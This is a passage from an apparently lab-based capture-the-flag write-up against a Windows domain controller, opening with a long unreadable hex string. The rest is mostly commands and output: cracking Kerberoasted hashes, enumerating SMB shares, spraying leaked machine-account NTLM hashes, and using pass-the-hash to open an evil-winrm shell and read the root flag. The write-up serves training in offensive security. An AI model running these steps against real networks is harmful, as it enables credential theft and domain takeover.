d1e3736a9aa1d308f1f77fb9f1ef442adf3bf4224e045b3c5fde95b3d41dcb5ca8d6407e719b873510a2feffc3a06d4bfcf84678ac3fd03a2b745e321ef104388b8834db848229b75cd5c42a727f56115f7cb6248390fbb4d760c696f7ef52818094f21afda00920f0c414620bbb9380029e6b0ed3a8da7a230e635ea907da5eaeb54d8fe54a4de79a993daba9e9a7868a83cf7cf05f89ee9a1a059a3545394b6a0d9f9919a559a0e2999755ca235e996dfa9699601d589d898e0902ca3ddc569dd8779da33c0731a7483758ec89d10ef11e198ae5b5e0f7b53941f6504cd28a98b244068030f1b823ed45faf814bd1f988e84aba666b27f7867a5f538258dba7ddfee304651ace157974427e9932369c3c892e65fd5d121ef9d61c16fde038cdd5cbdb165d2f985c3677c7c3767eac5516f7740220dc84d91f2e1c694a4e4a158d58a086a6fb216f4320e310c3cf5d4e0e0eabc31736b030eb1a8e3b8b49281ae8e4d69c6df5f5b15c4fd20fd599630bc7188988582e019a1e81298d3da2b3fee15df8b3619c73295b8b1715bdbb5c7c09eb815ec7711b3959cd8faba269668c77ed4b4bcc8d6afe7e69fa80afe1a95577631b5cca83a37720626301ab9b74c70a825333f5c8683b90a2e0ab3f6ac829e054a797

# Username:Hash format
└─$ awk -F'[$*]' '{print $5 ":" $0}' roasted.txt > roasted2.txt
```

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
Password123!!    (file_svc)
```

::: tip Creds
`file_svc:Password123!!`
:::

### SMB

```bash
└─$ netexec smb soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
SMB         10.0.2.70       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.70       445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
SMB         10.0.2.70       445    DC01             [*] Enumerated shares
SMB         10.0.2.70       445    DC01             Share           Permissions     Remark
SMB         10.0.2.70       445    DC01             -----           -----------     ------
SMB         10.0.2.70       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.70       445    DC01             backup          READ
SMB         10.0.2.70       445    DC01             C$                              Default share
SMB         10.0.2.70       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.70       445    DC01             NETLOGON        READ            Logon server share
SMB         10.0.2.70       445    DC01             SYSVOL          READ            Logon server share
SMB         10.0.2.70       445    DC01             Users

└─$ impacket-smbclient 'soupedecode.local'/'file_svc':'Password123!!'@'soupedecode.local'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use backup
# ls
drw-rw-rw-          0  Mon Jun 17 13:41:17 2024 .
drw-rw-rw-          0  Mon Jun 17 13:44:56 2024 ..
-rw-rw-rw-        892  Mon Jun 17 13:41:23 2024 backup_extract.txt
# cat backup_extract.txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

# get backup_extract.txt
```

### FileServer$

```bash
└─$ awk -F':' '{print $1}' backup_extract.txt > computers.txt
└─$ awk -F':' '{print $4}' backup_extract.txt > computers_ntlm.txt
└─$ netexec smb soupedecode.local -u computers.txt -H computers_ntlm.txt --continue-on-success --no-bruteforce
SMB         10.0.2.70       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
SMB         10.0.2.70       445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\MailServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\BackupServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\ApplicationServer$:8cd90ac6cba6dde9d8038b068c17e9f5 STATUS_LOGON_FAILURE
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\PrintServer$:b8a38c432ac59ed00b2a373f4f050d28 STATUS_LOGON_FAILURE
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\ProxyServer$:4e3f0bb3e5b6e3e662611b1a87988881 STATUS_LOGON_FAILURE
SMB         10.0.2.70       445    DC01             [-] SOUPEDECODE.LOCAL\MonitoringServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
```

::: tip Creds
`FileServer$:e41da7e79a4c76dbd9cf79d1cb325559`
:::

```bash
└─$ netexec smb soupedecode.local -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559' --shares
SMB         10.0.2.70       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.70       445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.0.2.70       445    DC01             [*] Enumerated shares
SMB         10.0.2.70       445    DC01             Share           Permissions     Remark
SMB         10.0.2.70       445    DC01             -----           -----------     ------
SMB         10.0.2.70       445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.0.2.70       445    DC01             backup
SMB         10.0.2.70       445    DC01             C$              READ,WRITE      Default share
SMB         10.0.2.70       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.70       445    DC01             NETLOGON        READ,WRITE      Logon server share
SMB         10.0.2.70       445    DC01             SYSVOL          READ,WRITE      Logon server share
SMB         10.0.2.70       445    DC01             Users

└─$ netexec winrm soupedecode.local -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
WINRM       10.0.2.70       5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL)
WINRM       10.0.2.70       5985   DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

## WinRM

```bash
└─$ evil-winrm -i soupedecode.local -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
*Evil-WinRM* PS C:\Users\FileServer$\Documents> whoami /all

User Name               SID
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

### Privilege Escalation (Administrator Group)

errr... not sure if intended but this machine is already part of `Administrators` group

Alternatively since we have so many privileges -> [https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#abusing-tokens](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#abusing-tokens)

### Root.txt

```bash
*Evil-WinRM* PS C:\Users> cat /Users/Administrator/Desktop/root.txt
a9564ebc3289b7a14551baf8ad5ec60a
```
